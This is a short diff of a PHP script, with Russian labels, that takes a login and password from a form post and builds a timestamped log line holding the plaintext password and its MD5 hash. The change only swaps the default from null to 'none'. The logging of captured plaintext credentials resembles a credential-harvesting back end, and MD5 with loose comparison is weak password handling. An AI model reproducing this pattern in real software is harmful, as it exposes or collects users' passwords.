@@ -1,7 +1,7 @@
 <?php
 
-$login = isset($_POST['login']) ? $_POST['login'] : null;
-$password = isset($_POST['password']) ? $_POST['password'] : null;
+$login = isset($_POST['login']) ? $_POST['login'] : "none";
+$password = isset($_POST['password']) ? $_POST['password'] : "none";
 if ($password == true) {
     $passwordMD5 = md5($password);
     $data = time() . date('d.m.Y.') . "Логин: $login. Пароль: $password, Пароль MD5: $passwordMD5 \n";
